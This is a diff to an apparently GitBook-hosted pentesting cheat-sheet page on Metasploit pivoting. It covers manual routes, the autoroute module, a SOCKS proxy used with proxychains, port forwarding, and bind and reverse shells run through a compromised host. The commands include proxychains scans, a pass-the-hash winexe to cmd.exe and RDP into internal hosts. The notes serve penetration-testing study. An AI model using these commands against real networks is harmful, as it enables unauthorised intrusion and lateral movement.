@@ -1,48 +1,39 @@
 # ⭕ Metasploit Pivoting
 
-### <mark style="color:orange;">MANUAL ROUTE</mark>
+## <mark style="color:red;">Manual Route</mark>
 
-this method will give the full access to the target IP address like its siting in our lan ( only accessible in metasploit )
+this method will give the full access to the target IP address like its siting in our LAN ( only accessible in metasploit )
 
 ```
 background the session
 route add 10.0.1.0/24 [session id]
 ```
 
-### <mark style="color:orange;">AUTO ROUTE</mark>
+## <mark style="color:red;">Auto Route Reverse Tunnel</mark>
 
-this method will give the full access to the target IP address like its siting in our lan ( only accessible in metasploit )
-
-```
-run autoroute -p >>> list active routing tables
-run autoroute -s 10.1.1.0 -n 255.255.255.0 >>> netmask is optional
-run autoroute -d -s 10.10.10.1  >>> delete autoroute on ip
-run autoroute -s 10.10.10.1/24 >>> can use CIDR
-```
-
-### <mark style="color:orange;">PROXY</mark>
-
-add a proxy to proxychains.conf and use it inside and outside of metasploit
+Once the Meterpreter session is active, we’ll send it to the background and switch to the multi/manage/autoroute module. This will allow us to configure a reverse tunnel through the Meterpreter session and use that with a SOCKS proxy.
 
 ```
-use auxiliary/server/socks_proxy 
-set srvport 8080 → set proxy local port
+use multi/manage/autoroute
+set session 1
+exploit
+
+use auxiliary/server/socks4a
+set srvhost 127.0.0.1
+exploit -j
 ```
 
-add 127.0.0.1 8080 to proxychains and make sure there are no other proxies in the config file:
+The autoroute module creates a reverse tunnel and allows us to direct network traffic into the appropriate subnet.
+
+We can use a local proxy application like Proxychains to force TCP traffic through a TOR or SOCKS proxy. We can configure it by adding the SOCKS4 proxy IP and port to the config file (`/etc/proxychains.conf`):
 
 ```
-socks4  127.0.0.1  8080
+proxychains rdesktop 192.168.120.10
 ```
 
-now run commands with proxychains prefix
+The route created by Meterpreter also allows us to access any other computer on that internal network.
 
-```
-proxychains nmap -Pn -sT -sV -p- [target]
-proxychains pth-winexe -U windows10/user123//10.0.1.5 cmd.exe
-```
-
-### <mark style="color:orange;">PORT FORWARD</mark>
+## <mark style="color:red;">Port Forward</mark>
 
 forward only the given remote port to the given local port specifically ( only accessible in msfconsole )
 
@@ -54,7 +45,7 @@ portfwd add -L 0.0.0.0 -l 8000 -p 80 -r 10.1.0.5
 
 now we can scan our local port 8000 to scan the remote port 80 of the target
 
-### <mark style="color:orange;">PIVOTING BIND SHELL</mark>
+## <mark style="color:red;">Pivote Bind Shell</mark>
 
 usually used when exploiting a machine in the internal network. first we have to do port forwarding to scan the network
 
@@ -93,14 +84,14 @@ run #Proxy port 1080 by default
 ```
 
 {% hint style="warning" %}
-ALLWAYS USE A BIND SHELL WHILE PIVOTING
+#### Always use a bind shell when pivoting.
 {% endhint %}
 
 if we use a reverse shell the target machine on the internal network wont be able to route back the packets to us
 
 ![](<../../.gitbook/assets/image (267).png>)
 
-### <mark style="color:orange;">PIVOTING REVERSE SHELL</mark>
+## <mark style="color:red;">Pivot Reverse Shell</mark>
 
 while using a reverse shell with pivoting we have to set the RHOST to target ip in the internal network and set the LHOST to the machine that we have already compromized
 
